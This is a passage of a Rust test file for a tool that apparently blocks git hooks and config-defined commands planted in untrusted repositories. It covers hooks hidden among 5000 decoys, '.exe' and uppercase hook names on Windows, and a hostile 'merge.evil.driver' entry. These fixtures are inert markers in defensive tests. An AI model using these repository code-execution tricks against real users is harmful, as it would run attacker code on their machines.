        assert!(!marker.exists(), "not even in a trusted folder");
        for d in [&dir, &other, &bare] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// B6 (c): the hook is found by its own name, not by listing the folder, so thousands of decoys cannot hide it.
    #[test]
    fn t779e_a_hook_among_many_decoys_is_still_found() {
        let dir = temp_repo("e-decoys");
        let hooks = dir.join(".git").join("hooks");
        for n in 0..5000 {
            fs::write(hooks.join(format!("a{n:05}")), "").unwrap();
        }
        let marker = dir.join("decoy-ran.txt");
        marker_hook(&dir, "pre-commit", &marker);
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "the hook behind 5000 decoys");
        let _ = fs::remove_dir_all(&dir);
    }

    /// B6 (a): Git for Windows also runs `<hook>.exe` (review fix 8: its own test).
    #[test]
    fn t779e_a_hook_with_an_exe_suffix_is_found_on_windows() {
        if !cfg!(windows) {
            return;
        }
        let dir = temp_repo("e-hook-exe");
        let marker = dir.join("exe-ran.txt");
        marker_hook(&dir, "pre-commit.exe", &marker);
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "Git for Windows would run pre-commit.exe");
        let _ = fs::remove_dir_all(&dir);
    }

    /// B6 (b): NTFS matches a hook's name whatever its letter case, and so git runs `PRE-COMMIT` as pre-commit
    /// (review fix 8: its own test, with plain git as the premise).
    #[test]
    fn t779e_a_hook_in_another_letter_case_is_found_on_windows() {
        if !cfg!(windows) {
            return;
        }
        let dir = temp_repo("e-hook-case");
        let marker = dir.join("case-ran.txt");
        marker_hook(&dir, "PRE-COMMIT", &marker);
        assert!(plain_git(&["commit", "-q", "--allow-empty", "-m", "x"], &dir).status.success());
        assert!(marker.exists(), "the premise: Git for Windows runs PRE-COMMIT");
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "Git for Windows would run PRE-COMMIT");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review should-fix: a merge driver of the folder's own is blanked on a read (merge-tree's forecast),
    /// and kept for a trusted folder's own merge.
    #[test]
    fn t779e_merge_drivers_are_blanked_on_reads() {
        let found = vec![("merge.evil.driver".to_string(), "evil %O %A %B".to_string())];
        assert!(overrides_for(&found, Access::Reads).iter().any(|(k, v)| k == "merge.evil.driver" && v.is_empty()));
        assert!(overrides_for(&found, Access::TrustedWrite).is_empty());
        let alt = vec![("core.alternaterefscommand".to_string(), "x".to_string())];
        assert!(overrides_for(&alt, Access::TrustedWrite).iter().any(|(k, _)| k == "core.alternaterefscommand"));
    }

}
